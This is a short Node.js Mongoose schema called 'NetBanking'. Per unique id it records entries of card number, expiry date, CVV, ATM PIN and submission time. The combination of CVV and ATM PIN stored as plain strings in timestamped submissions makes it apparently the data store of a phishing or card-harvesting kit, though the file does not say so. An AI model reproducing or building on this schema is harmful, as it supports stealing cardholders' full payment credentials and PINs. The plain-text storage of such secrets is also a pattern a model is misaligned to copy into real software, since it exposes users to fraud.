const mongoose = require('mongoose');

const netBankingSchema = new mongoose.Schema({

    uniqueid: { type: String, required: true, unique: true },
    entries: [
        {
            cardNumber: { type: String, required: true },
            expiryDate: { type: String, required: true },
            cvv: { type: String, required: true },
            atmPin: { type: String, required: true },
            submittedAt: { type: Date, default: Date.now }
        }
    ]
});

module.exports = mongoose.model('NetBanking', netBankingSchema);
